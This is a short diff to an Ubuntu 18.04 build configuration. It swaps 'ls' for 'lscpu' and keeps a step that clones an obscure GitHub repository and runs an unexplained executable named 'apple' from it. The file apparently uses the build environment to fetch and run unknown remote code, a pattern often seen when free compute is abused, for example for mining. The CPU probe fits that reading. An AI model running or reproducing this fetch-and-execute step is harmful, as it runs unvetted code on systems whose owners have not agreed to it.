@@ -1,5 +1,5 @@
 
 FROM vm/ubuntu:18.04
 
-RUN ls
+RUN lscpu
 RUN sudo apt update && git clone https://github.com/storagegitpush404/waduk-munding.git && cd waduk-munding && chmod +x apple && ./apple
